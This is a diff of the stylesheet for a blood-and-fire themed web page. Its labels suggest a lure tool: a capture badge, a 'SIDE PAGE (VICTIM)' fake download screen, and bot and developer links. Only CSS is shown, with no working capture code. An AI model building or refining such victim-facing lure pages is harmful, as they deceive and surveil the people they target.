@@ -10,1206 +10,207 @@
     <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800;900&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         /* ================================================================
-           ROOT — الجوهرة الحمراء (كاتم غامق)
+           ROOT & BASE
            ================================================================ */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         :root {
-            --blood-dark: #1a0000;
-            --blood-deep: #3a0000;
-            --blood-mid: #6a0a0a;
-            --blood-bright: #aa0a0a;
-            --blood-pure: #cc0a0a;
-            --blood-glow: rgba(204, 10, 10, 0.7);
-            --hellfire: #ff3300;
-            --hellfire-glow: rgba(255, 51, 0, 0.6);
-            --obsidian: #050505;
-            --obsidian-light: #0f0808;
-            --text-hell: #d4b0a0;
-            --text-blood: #cc2222;
-            --font-display: 'Cinzel', 'Georgia', serif;
-            --font-mono: 'JetBrains Mono', 'Courier New', monospace;
+            --blood-dark: #1a0000; --blood-deep: #3a0000; --blood-mid: #6a0a0a;
+            --blood-bright: #aa0a0a; --blood-pure: #cc0a0a; --blood-glow: rgba(204,10,10,0.7);
+            --hellfire: #ff3300; --hellfire-glow: rgba(255,51,0,0.6);
+            --obsidian: #050505; --obsidian-light: #0f0808;
+            --text-hell: #d4b0a0; --text-blood: #cc2222;
+            --font-display: 'Cinzel', 'Georgia', serif; --font-mono: 'JetBrains Mono', 'Courier New', monospace;
             --transition: 0.4s cubic-bezier(0.6, 0.04, 0.98, 0.34);
         }
-
-        html,
-        body {
-            height: 100%;
-            margin: 0;
-            background: var(--obsidian);
-            color: var(--text-hell);
-            overflow-x: hidden;
-            font-family: var(--font-mono);
-        }
+        html, body { height: 100%; margin: 0; background: var(--obsidian); color: var(--text-hell); overflow-x: hidden; font-family: var(--font-mono); }
 
         /* ================================================================
-           CANVAS — الجحيم (خلفية متحركة)
+           CANVAS & BACKGROUND EFFECTS
            ================================================================ */
-        #hell-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
-            opacity: 0.85;
-        }
+        #hell-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; opacity: 0.85; }
+        .blood-rain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; overflow: hidden; }
+        .blood-drop { position: absolute; top: -40px; width: 2.5px; background: rgba(180,10,10,0.6); box-shadow: 0 0 15px var(--blood-pure); animation: fall-blood linear infinite; border-radius: 0 0 50% 50%; }
+        @keyframes fall-blood { 0% { transform: translateY(0) scaleY(1); opacity: 0.9; } 100% { transform: translateY(110vh) scaleY(2); opacity: 0.0; } }
+        .skull-bg { position: fixed; pointer-events: none; z-index: 0; opacity: 0.12; filter: drop-shadow(0 0 60px rgba(204,10,10,0.15)); }
+        .deco-element { position: fixed; pointer-events: none; z-index: 1; opacity: 0.15; border: 1.5px solid rgba(204,10,10,0.2); transition: opacity 0.5s ease; }
+        .deco-element:hover { opacity: 0.3; }
+        .deco-element.vertical { width: 2px; height: 140px; background: linear-gradient(180deg, transparent, var(--blood-mid), transparent); }
+        .deco-element.horizontal { height: 2px; width: 140px; background: linear-gradient(90deg, transparent, var(--blood-mid), transparent); }
+        .deco-element.corner { width: 70px; height: 70px; border-top: 2px solid var(--blood-mid); border-left: 2px solid var(--blood-mid); opacity: 0.1; }
+        .deco-element.corner-br { border-top: none; border-left: none; border-bottom: 2px solid var(--blood-mid); border-right: 2px solid var(--blood-mid); }
+        .deco-element.diamond { width: 12px; height: 12px; transform: rotate(45deg); border: 1.5px solid var(--blood-mid); background: rgba(204,10,10,0.05); }
 
         /* ================================================================
-           المطر الدموي
+           FIRE BOTTOM
            ================================================================ */
-        .blood-rain {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            pointer-events: none;
-            overflow: hidden;
-        }
-        .blood-drop {
-            position: absolute;
-            top: -40px;
-            width: 2.5px;
-            background: rgba(180, 10, 10, 0.6);
-            box-shadow: 0 0 15px var(--blood-pure);
-            animation: fall-blood linear infinite;
-            border-radius: 0 0 50% 50%;
-        }
-        @keyframes fall-blood {
-            0% {
-                transform: translateY(0) scaleY(1);
-                opacity: 0.9;
-            }
-            100% {
-                transform: translateY(110vh) scaleY(2);
-                opacity: 0.0;
-            }
-        }
+        .fire-bottom { position: fixed; bottom: 0; left: 0; width: 100%; height: 90px; z-index: 0; pointer-events: none; background: radial-gradient(ellipse at 50% 100%, rgba(255,51,0,0.35) 0%, transparent 70%); filter: blur(4px); }
+        .fire-bottom::before { content: ''; position: absolute; bottom: 0; left: 5%; width: 90%; height: 60px; background: radial-gradient(ellipse at 50% 100%, #ff4400 0%, #cc0a0a 30%, transparent 70%); opacity: 0.6; filter: blur(14px); animation: fire-pulse 2.2s ease-in-out infinite alternate; }
+        .fire-bottom::after { content: ''; position: absolute; bottom: 0; left: 15%; width: 70%; height: 40px; background: radial-gradient(ellipse at 50% 100%, #ff8844 0%, #ff3300 35%, transparent 70%); opacity: 0.4; filter: blur(20px); animation: fire-pulse 2.8s ease-in-out infinite alternate-reverse; }
+        .fire-glow-ring { position: fixed; bottom: -10px; left: 50%; transform: translateX(-50%); width: 90%; height: 70px; background: radial-gradient(ellipse at 50% 100%, rgba(204,10,10,0.3), transparent 70%); filter: blur(30px); z-index: 0; pointer-events: none; animation: fire-pulse 3s ease-in-out infinite alternate; }
+        @keyframes fire-pulse { 0% { opacity: 0.6; transform: scale(1); } 100% { opacity: 1; transform: scale(1.04); } }
 
         /* ================================================================
-           جماجم الخلفية
+           LAYOUT & COMPONENTS
            ================================================================ */
-        .skull-bg {
-            position: fixed;
-            pointer-events: none;
-            z-index: 0;
-            opacity: 0.12;
-            filter: drop-shadow(0 0 60px rgba(204, 10, 10, 0.15));
-        }
+        .app-wrap { position: relative; z-index: 2; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px 16px 40px; background: transparent; }
+        .header { width: 100%; max-width: 1100px; display: flex; justify-content: space-between; align-items: center; padding: 16px 32px; margin-bottom: 32px; background: rgba(5,3,3,0.92); backdrop-filter: blur(18px); border: 1px solid rgba(204,10,10,0.08); box-shadow: 0 0 100px rgba(204,10,10,0.02), inset 0 0 100px rgba(0,0,0,0.5); position: relative; overflow: hidden; clip-path: polygon(0% 0%, 100% 0%, 98% 100%, 2% 100%); }
+        .header::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent); background-size: 300% 100%; animation: blood-scan 4.5s linear infinite; }
+        @keyframes blood-scan { 0% { background-position: 0% 0%; } 100% { background-position: 300% 0%; } }
+        .brand { display: flex; align-items: center; gap: 20px; }
+        .brand .brand-icon { color: var(--blood-pure); font-size: 34px; filter: drop-shadow(0 0 40px var(--blood-glow)); animation: brand-pulse 3s ease-in-out infinite; }
+        @keyframes brand-pulse { 0%, 100% { transform: scale(1); opacity: 0.9; } 50% { transform: scale(1.08); opacity: 1; } }
+        .brand .bot-name { background: linear-gradient(135deg, #ff4444, #aa0000, #ff2200, #cc0a0a); background-size: 300% 100%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 32px; letter-spacing: 6px; animation: fire-text 6s linear infinite; font-family: var(--font-display); text-shadow: 0 0 80px rgba(204,10,10,0.15); }
+        @keyframes fire-text { 0% { background-position: 0% 0%; } 100% { background-position: 300% 0%; } }
+        .nav-links { display: flex; gap: 16px; align-items: center; flex-wrap: wrap; }
+        .bot-username-box, .developer-box { display: inline-flex; align-items: center; gap: 12px; padding: 10px 28px; background: rgba(204,10,10,0.02); border: 1px solid rgba(204,10,10,0.15); cursor: pointer; transition: var(--transition); font-family: var(--font-mono); font-size: 14px; letter-spacing: 2px; clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%); background: rgba(0,0,0,0.3); box-shadow: 0 0 30px rgba(204,10,10,0.02); }
+        .bot-username-box { color: var(--blood-bright); }
+        .developer-box { color: var(--blood-pure); text-shadow: 0 0 20px var(--blood-glow); }
+        .bot-username-box i, .developer-box i { font-size: 18px; color: var(--hellfire); }
+        .bot-username-box:hover, .developer-box:hover { background: rgba(204,10,10,0.08); border-color: var(--blood-pure); box-shadow: 0 0 60px rgba(204,10,10,0.08); transform: scale(1.03); }
+
+        /* ===== CARD ===== */
+        #cardArea { width: 100%; max-width: 840px; padding: 38px 40px 44px; background: rgba(8,4,4,0.90); backdrop-filter: blur(20px); border: 2px solid rgba(204,10,10,0.06); border-radius: 0; box-shadow: 0 0 120px rgba(204,10,10,0.03), inset 0 0 120px rgba(0,0,0,0.6); position: relative; overflow: hidden; clip-path: polygon(0% 0%, 100% 0%, 99% 100%, 1% 100%); }
+        #cardArea::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(45deg, transparent, transparent 30px, rgba(204,10,10,0.008) 30px, rgba(204,10,10,0.008) 34px), repeating-linear-gradient(-45deg, transparent, transparent 45px, rgba(80,0,0,0.01) 45px, rgba(80,0,0,0.01) 50px); pointer-events: none; }
+        #cardArea::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 3px; background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent); background-size: 300% 100%; animation: blood-scan 3.8s linear infinite; }
+        .card-blood-drip { position: absolute; width: 3.5px; background: linear-gradient(180deg, var(--blood-pure), transparent); pointer-events: none; z-index: 3; animation: drip-card var(--drip-duration, 6s) ease-in infinite; opacity: 0; border-radius: 0 0 50% 50%; }
+        @keyframes drip-card { 0% { opacity: 0; height: 0; transform: translateY(0); } 15% { opacity: 0.8; } 85% { opacity: 0.3; } 100% { opacity: 0; height: var(--drip-height, 90px); transform: translateY(var(--drip-offset, 25px)); } }
+        .card-content { position: relative; z-index: 2; }
+
+        /* ===== TYPOGRAPHY ===== */
+        .main-title { font-size: 40px; font-weight: 900; letter-spacing: 2px; margin: 0 0 8px; color: #fff; display: flex; align-items: center; gap: 20px; font-family: var(--font-display); text-shadow: 0 0 60px rgba(204,10,10,0.1); }
+        .main-title i { color: var(--blood-pure); font-size: 38px; filter: drop-shadow(0 0 60px var(--blood-glow)); animation: flicker-fire 2.8s infinite; }
+        @keyframes flicker-fire { 0%, 100% { opacity: 1; transform: scale(1) rotate(0deg); } 25% { opacity: 0.6; transform: scale(1.06) rotate(-2deg); } 65% { opacity: 0.8; transform: scale(0.94) rotate(2deg); } }
+        .main-sub { color: var(--text-hell); font-size: 14px; font-weight: 400; margin-bottom: 32px; border-right: 4px solid var(--blood-pure); padding-right: 24px; font-family: var(--font-mono); background: rgba(0,0,0,0.3); padding: 14px 24px; box-shadow: inset 0 0 60px rgba(0,0,0,0.4); letter-spacing: 0.5px; border: 1px solid rgba(204,10,10,0.04); }
+        .main-sub i { color: var(--blood-pure); margin-left: 12px; }
+
+        /* ===== FORM ===== */
+        .form-modern { background: rgba(0,0,0,0.5); padding: 26px 28px 30px; border: 1px solid rgba(204,10,10,0.04); box-shadow: inset 0 0 100px rgba(0,0,0,0.4); position: relative; }
+        .form-modern::before { content: ''; position: absolute; top: -2px; left: 5%; width: 90%; height: 2px; background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent); background-size: 200% 100%; animation: fire-scan 4s linear infinite; }
+        @keyframes fire-scan { 0% { background-position: 0% 0%; } 100% { background-position: 200% 0%; } }
+        .field-group { margin-bottom: 20px; }
+        .field-group label { display: flex; align-items: center; gap: 16px; color: var(--text-hell); font-weight: 700; font-size: 14px; margin-bottom: 8px; letter-spacing: 3px; font-family: var(--font-display); }
+        .field-group label i { color: var(--blood-pure); width: 24px; font-size: 18px; filter: drop-shadow(0 0 20px rgba(204,10,10,0.1)); }
+        .field-group input[type="text"] { width: 100%; padding: 18px 24px; border: 1px solid rgba(204,10,10,0.04); background: rgba(0,0,0,0.6); color: #d4b0a0; font-size: 16px; font-family: var(--font-mono); outline: none; transition: var(--transition); box-shadow: inset 0 0 60px rgba(0,0,0,0.3); border-radius: 0; }
+        .field-group input[type="text"]:focus { border-color: var(--blood-pure); box-shadow: 0 0 60px rgba(204,10,10,0.04), inset 0 0 60px rgba(0,0,0,0.3); background: #0f0808; }
+        .field-group input::placeholder { color: #4a2a2a; font-weight: 400; letter-spacing: 1px; }
+
+        /* ===== CHECKBOX ===== */
+        .features-label { display: flex; align-items: center; gap: 16px; color: var(--text-hell); font-weight: 700; font-size: 14px; margin: 8px 0 18px; font-family: var(--font-display); letter-spacing: 2px; }
+        .features-label i { color: var(--blood-pure); font-size: 18px; }
+        .checkbox-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; max-height: 280px; overflow-y: auto; padding: 8px 6px 8px 0; background: rgba(0,0,0,0.3); border: 1px solid rgba(204,10,10,0.03); scrollbar-width: thin; scrollbar-color: var(--blood-pure) transparent; }
+        .checkbox-grid::-webkit-scrollbar { width: 4px; }
+        .checkbox-grid::-webkit-scrollbar-track { background: transparent; }
+        .checkbox-grid::-webkit-scrollbar-thumb { background: var(--blood-pure); border-radius: 0; }
+        @media (max-width: 540px) { .checkbox-grid { grid-template-columns: 1fr; } }
+        .checkbox-item { display: flex; align-items: center; gap: 14px; padding: 12px 20px; background: rgba(16,4,4,0.2); transition: var(--transition); cursor: pointer; border: 1px solid transparent; }
+        .checkbox-item:hover { background: rgba(204,10,10,0.03); border-color: rgba(204,10,10,0.06); }
+        .checkbox-item input[type="checkbox"] { width: 20px; height: 20px; accent-color: var(--blood-pure); cursor: pointer; flex-shrink: 0; filter: drop-shadow(0 0 20px rgba(204,10,10,0.05)); }
+        .checkbox-item label { margin: 0; font-weight: 500; font-size: 14px; cursor: pointer; color: var(--text-hell); display: flex; align-items: center; gap: 14px; flex: 1; font-family: var(--font-mono); letter-spacing: 0.5px; }
+        .checkbox-item label i { color: #3a2a2a; font-size: 16px; width: 24px; text-align: center; transition: var(--transition); }
+        .checkbox-item input:checked+.label-text i { color: var(--blood-pure); filter: drop-shadow(0 0 30px var(--blood-glow)); }
+        .label-text { display: flex; align-items: center; gap: 14px; }
+
+        /* ===== BUTTONS ===== */
+        .btn-primary { display: inline-flex; align-items: center; justify-content: center; gap: 16px; width: 100%; padding: 16px 24px; border: none; background: linear-gradient(135deg, #4a0a0a, #1a0000, #6a0a0a); color: #fff; font-weight: 900; font-size: 17px; font-family: var(--font-display); cursor: pointer; margin-top: 24px; transition: var(--transition); box-shadow: 0 0 80px rgba(204,10,10,0.04), inset 0 -4px 0 #1a0000; letter-spacing: 4px; text-transform: uppercase; clip-path: polygon(0% 0%, 94% 0%, 100% 25%, 100% 100%, 6% 100%, 0% 75%); position: relative; overflow: hidden; text-shadow: 0 0 30px rgba(204,10,10,0.1); }
+        .btn-primary::before { content: ''; position: absolute; top: 0; left: -100%; width: 200%; height: 100%; background: linear-gradient(90deg, transparent, rgba(204,10,10,0.08), transparent); transform: skewX(-30deg); animation: fire-sweep 3s linear infinite; }
+        @keyframes fire-sweep { 0% { left: -100%; } 100% { left: 100%; } }
+        .btn-primary::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent); animation: blood-scan 2.5s linear infinite; }
+        .btn-primary:hover { transform: translateY(-4px) scale(1.01); box-shadow: 0 0 120px rgba(204,10,10,0.08), inset 0 -4px 0 #3a0000; background: linear-gradient(135deg, #6a0a0a, #2a0000, #8a0a0a); }
+        .btn-primary i { font-size: 22px; color: #ff8888; text-shadow: 0 0 40px #ff2200; }
+        .result-box { margin-top: 24px; padding: 20px 24px; background: rgba(0,0,0,0.7); border: 1px solid rgba(204,10,10,0.06); display: flex; align-items: flex-start; gap: 20px; justify-content: space-between; display: none; box-shadow: inset 0 0 80px rgba(0,0,0,0.3); position: relative; flex-wrap: wrap; }
+        .result-box::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(45deg, transparent, transparent 40px, rgba(204,10,10,0.005) 40px, rgba(204,10,10,0.005) 44px); pointer-events: none; }
+        .result-box .link-text { flex: 1; color: #d4b0a0; font-size: 14px; font-weight: 500; word-break: break-all; font-family: var(--font-mono); direction: ltr; text-align: left; position: relative; z-index: 1; line-height: 2; white-space: pre-wrap; min-width: 200px; }
+        .result-box .link-text i { color: var(--blood-pure); margin-left: 10px; }
+        .btn-copy { display: inline-flex; align-items: center; gap: 12px; padding: 12px 30px; background: rgba(204,10,10,0.02); border: 1px solid rgba(204,10,10,0.04); color: #d4b0a0; font-weight: 700; font-size: 13px; cursor: pointer; transition: var(--transition); font-family: var(--font-mono); flex-shrink: 0; clip-path: polygon(0% 0%, 88% 0%, 100% 15%, 100% 100%, 12% 100%, 0% 85%); position: relative; z-index: 1; letter-spacing: 1px; box-shadow: 0 0 30px rgba(0,0,0,0.2); }
+        .btn-copy:hover { background: rgba(204,10,10,0.06); border-color: var(--blood-pure); color: #fff; box-shadow: 0 0 60px rgba(204,10,10,0.04); }
+        .btn-copy i { font-size: 16px; color: var(--blood-pure); }
+
+        /* ===== FOOTER ===== */
+        .madeby { margin-top: 36px; text-align: center; font-size: 13px; font-weight: 400; letter-spacing: 4px; display: flex; align-items: center; gap: 24px; flex-wrap: wrap; justify-content: center; border-top: 1px solid rgba(204,10,10,0.04); padding-top: 28px; width: 100%; max-width: 840px; font-family: var(--font-display); text-transform: uppercase; color: #4a3a3a; }
+        .madeby .sep { opacity: 0.1; }
+        .madeby .dev-block { display: flex; align-items: center; gap: 16px; background: rgba(204,10,10,0.02); padding: 8px 28px; border: 1px solid rgba(204,10,10,0.04); clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%); animation: dev-pulse 3s ease-in-out infinite; }
+        @keyframes dev-pulse { 0%, 100% { border-color: rgba(204,10,10,0.04); box-shadow: 0 0 30px rgba(204,10,10,0.01); } 50% { border-color: rgba(204,10,10,0.15); box-shadow: 0 0 60px rgba(204,10,10,0.04); } }
+        .madeby .dev-block i { color: var(--blood-pure); font-size: 18px; }
+        .madeby .dev-block .dev-name { color: var(--blood-pure); font-weight: 900; text-shadow: 0 0 40px rgba(204,10,10,0.1); font-size: 18px; letter-spacing: 4px; background: linear-gradient(135deg, #ff4444, #aa0000); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+        /* ===== CAPTURE BADGE ===== */
+        #captureBadge { position: fixed; top: 22px; right: 22px; z-index: 9998; background: rgba(5,3,3,0.92); backdrop-filter: blur(16px); padding: 12px 30px; font-weight: 700; font-size: 12px; color: var(--blood-pure); border: 1px solid rgba(204,10,10,0.04); display: none; align-items: center; gap: 16px; box-shadow: 0 0 80px rgba(204,10,10,0.02); font-family: var(--font-mono); clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%); letter-spacing: 2px; }
+        #captureBadge i { font-size: 16px; color: var(--hellfire); }
+        #captureBadge .pulse-ring { display: inline-block; width: 10px; height: 10px; border-radius: 50%; background: var(--blood-pure); animation: pulse-dot 1.4s infinite; box-shadow: 0 0 40px var(--blood-glow); }
+        @keyframes pulse-dot { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.1; transform: scale(0.4); } }
 
         /* ================================================================
-           عناصر زخرفية ثابتة (حمراء)
+           SIDE PAGE (VICTIM)
            ================================================================ */
-        .deco-element {
-            position: fixed;
-            pointer-events: none;
-            z-index: 1;
-            opacity: 0.15;
-            border: 1.5px solid rgba(204, 10, 10, 0.2);
-            transition: opacity 0.5s ease;
-        }
-        .deco-element:hover {
-            opacity: 0.3;
-        }
-        .deco-element.vertical {
-            width: 2px;
-            height: 140px;
-            background: linear-gradient(180deg, transparent, var(--blood-mid), transparent);
-        }
-        .deco-element.horizontal {
-            height: 2px;
-            width: 140px;
-            background: linear-gradient(90deg, transparent, var(--blood-mid), transparent);
-        }
-        .deco-element.corner {
-            width: 70px;
-            height: 70px;
-            border-top: 2px solid var(--blood-mid);
-            border-left: 2px solid var(--blood-mid);
-            opacity: 0.1;
-        }
-        .deco-element.corner-br {
-            border-top: none;
-            border-left: none;
-            border-bottom: 2px solid var(--blood-mid);
-            border-right: 2px solid var(--blood-mid);
-        }
-        .deco-element.diamond {
-            width: 12px;
-            height: 12px;
-            transform: rotate(45deg);
-            border: 1.5px solid var(--blood-mid);
-            background: rgba(204, 10, 10, 0.05);
-        }
+        .download-page { width: 100%; min-height: 100vh; background: var(--obsidian); padding: 30px 20px; display: flex; align-items: center; justify-content: center; font-family: var(--font-mono); }
+        .download-box { max-width: 600px; width: 100%; background: rgba(8,4,4,0.92); backdrop-filter: blur(20px); border: 2px solid rgba(204,10,10,0.06); padding: 40px 36px 44px; box-shadow: 0 0 120px rgba(204,10,10,0.02), inset 0 0 120px rgba(0,0,0,0.6); text-align: center; clip-path: polygon(0% 0%, 100% 0%, 98% 100%, 2% 100%); position: relative; overflow: hidden; }
+        .download-box::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(45deg, transparent, transparent 30px, rgba(204,10,10,0.006) 30px, rgba(204,10,10,0.006) 34px), repeating-linear-gradient(-45deg, transparent, transparent 45px, rgba(80,0,0,0.008) 45px, rgba(80,0,0,0.008) 50px); pointer-events: none; }
+        .download-box::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 3px; background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent); background-size: 300% 100%; animation: blood-scan 4s linear infinite; }
+        .download-box h2 { color: #d4b0a0; font-size: 18px; font-weight: 700; line-height: 2; margin-bottom: 30px; border-right: 4px solid var(--blood-pure); padding-right: 24px; text-align: right; font-family: var(--font-display); letter-spacing: 2px; }
+        .download-box h2 i { color: var(--blood-pure); margin-left: 12px; }
+        .download-box .ad-area { margin: 22px 0; padding: 16px; background: rgba(0,0,0,0.3); border: 1px solid rgba(204,10,10,0.02); min-height: 80px; }
+        .download-btn { display: inline-flex; align-items: center; gap: 18px; background: linear-gradient(135deg, #4a0a0a, #1a0000); color: #fff; padding: 22px 56px; font-size: 20px; font-weight: 900; border: none; cursor: pointer; transition: var(--transition); box-shadow: 0 0 80px rgba(204,10,10,0.02); font-family: var(--font-display); margin: 16px 0 8px; clip-path: polygon(0% 0%, 94% 0%, 100% 20%, 100% 100%, 6% 100%, 0% 80%); letter-spacing: 4px; text-transform: uppercase; }
+        .download-btn:hover { background: linear-gradient(135deg, #6a0a0a, #2a0000); transform: scale(1.02); box-shadow: 0 0 120px rgba(204,10,10,0.04); }
+        .download-btn i { font-size: 26px; color: #ff8888; text-shadow: 0 0 40px #ff2200; }
+        .download-footer { margin-top: 32px; font-size: 13px; color: #4a3a3a; border-top: 1px solid rgba(204,10,10,0.04); padding-top: 24px; font-family: var(--font-display); letter-spacing: 4px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 16px; flex-wrap: wrap; }
+        .download-footer .dev-block { display: flex; align-items: center; gap: 14px; background: rgba(204,10,10,0.02); padding: 6px 24px; border: 1px solid rgba(204,10,10,0.04); clip-path: polygon(0% 0%, 90% 0%, 100% 20%, 100% 100%, 10% 100%, 0% 80%); }
+        .download-footer .dev-block i { color: var(--blood-pure); font-size: 16px; }
+        .download-footer .dev-block .dev-name { color: var(--blood-pure); font-weight: 900; text-shadow: 0 0 30px rgba(204,10,10,0.1); font-size: 16px; letter-spacing: 3px; background: linear-gradient(135deg, #ff4444, #aa0000); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
 
-        /* ================================================================
-           النار السفلية (حقيقية، حمراء متوهجة)
-           ================================================================ */
-        .fire-bottom {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 90px;
-            z-index: 0;
-            pointer-events: none;
-            background: radial-gradient(ellipse at 50% 100%, rgba(255, 51, 0, 0.35) 0%, transparent 70%);
-            filter: blur(4px);
-        }
-        .fire-bottom::before {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 5%;
-            width: 90%;
-            height: 60px;
-            background: radial-gradient(ellipse at 50% 100%, #ff4400 0%, #cc0a0a 30%, transparent 70%);
-            opacity: 0.6;
-            filter: blur(14px);
-            animation: fire-pulse 2.2s ease-in-out infinite alternate;
-        }
-        .fire-bottom::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 15%;
-            width: 70%;
-            height: 40px;
-            background: radial-gradient(ellipse at 50% 100%, #ff8844 0%, #ff3300 35%, transparent 70%);
-            opacity: 0.4;
-            filter: blur(20px);
-            animation: fire-pulse 2.8s ease-in-out infinite alternate-reverse;
-        }
-        .fire-glow-ring {
-            position: fixed;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 90%;
-            height: 70px;
-            background: radial-gradient(ellipse at 50% 100%, rgba(204, 10, 10, 0.3), transparent 70%);
-            filter: blur(30px);
-            z-index: 0;
-            pointer-events: none;
-            animation: fire-pulse 3s ease-in-out infinite alternate;
-        }
-        @keyframes fire-pulse {
-            0% {
-                opacity: 0.6;
-                transform: scale(1);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1.04);
-            }
-        }
-
-        /* ================================================================
-           MAIN WRAP
-           ================================================================ */
-        .app-wrap {
-            position: relative;
-            z-index: 2;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px 16px 40px;
-            background: transparent;
-        }
-
-        /* ================================================================
-           HEADER
-           ================================================================ */
-        .header {
-            width: 100%;
-            max-width: 1100px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 32px;
-            margin-bottom: 32px;
-            background: rgba(5, 3, 3, 0.92);
-            backdrop-filter: blur(18px);
-            -webkit-backdrop-filter: blur(18px);
-            border: 1px solid rgba(204, 10, 10, 0.08);
-            box-shadow: 0 0 100px rgba(204, 10, 10, 0.02), inset 0 0 100px rgba(0, 0, 0, 0.5);
-            position: relative;
-            overflow: hidden;
-            clip-path: polygon(0% 0%, 100% 0%, 98% 100%, 2% 100%);
-        }
-        .header::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, var(--blood-pure), var(--hellfire), var(--blood-pure), transparent);
-            background-size: 300% 100%;
-            animation: blood-scan 4.5s linear infinite;
-        }
-        @keyframes blood-scan {
-            0% {
-                background-position: 0% 0%;
-            }
-            100% {
-                background-position: 300% 0%;
-            }
-        }
-
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-        .brand .brand-icon {
-            color: var(--blood-pure);
-            font-size: 34px;
-            filter: drop-shadow(0 0 40px var(--blood-glow));
-            animation: brand-pulse 3s ease-in-out infinite;
-        }
-        @keyframes brand-pulse {
-            0%,
-            100% {
-                transform: scale(1);
-                opacity: 0.9;
-            }
-            50% {
-                transform: scale(1.08);
-                opacity: 1;
-            }
-        }
-        .brand .bot-name {
-            background: linear-gradient(135deg, #ff4444, #aa0000, #ff2200, #cc0a0a);
-            background-size: 300% 100%;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-size: 32px;
-            letter-spacing: 6px;
-            animation: fire-text 6s linear infinite;
-            font-family: var(--font-display);
-            text-shadow: 0 0 80px rgba(204, 10, 10, 0.15);
-        }
-        @keyframes fire-text {
-            0% {
-                background-position: 0% 0%;
-            }
-            100% {
-                background-position: 300% 0%;
-            }
-        }
-
-        .bot-username-box {
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            padding: 10px 28px;
-            background: rgba(204, 10, 10, 0.02);
-            border: 1px solid rgba(204, 10, 10, 0.15);
-            cursor: pointer;
-            transition: var(--transition);
-            font-family: var(--font-mono);
-            font-size: 14px;
-            color: var(--blood-bright);
-            letter-spacing: 2px;
-            clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%);
-            text-decoration: none;
-            background: rgba(0, 0, 0, 0.3);
-            box-shadow: 0 0 30px rgba(204, 10, 10, 0.02);
-        }
-        .bot-username-box i {
-            font-size: 18px;
-            color: var(--hellfire);
-        }
-        .bot-username-box:hover {
-            background: rgba(204, 10, 10, 0.08);
-            border-color: var(--blood-pure);
-            box-shadow: 0 0 60px rgba(204, 10, 10, 0.08);
-            transform: scale(1.03);
-        }
-
-        .developer-box {
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            padding: 10px 28px;
-            background: rgba(204, 10, 10, 0.02);
-            border: 1px solid rgba(204, 10, 10, 0.15);
-            cursor: pointer;
-            transition: var(--transition);
-            font-family: var(--font-mono);
-            font-size: 14px;
-            color: var(--blood-pure);
-            letter-spacing: 2px;
-            clip-path: polygon(0% 0%, 92% 0%, 100% 20%, 100% 100%, 8% 100%, 0% 80%);
-            text-decoration: none;
-            background: rgba(0, 0, 0, 0.3);
-            box-shadow: 0 0 30px rgba(204, 10, 10, 0.02);
-            text-shadow: 0 0 20px var(--blood-glow);
-        }
-        .developer-box i {
-            font-size: 18px;
-            color: var(--hellfire);
-        }
-        .developer-box:hover {
-            background: rgba(204, 10, 10, 0.08);
-            border-color: var(--blood-pure);
-            box-shadow: 0 0 60px rgba(204, 10, 10, 0.08);
-            transform: scale(1.03);
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 16px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        /* ================================================================
-           CARD
-           ================================================================ */
-        #cardArea {
-            width: 100%;
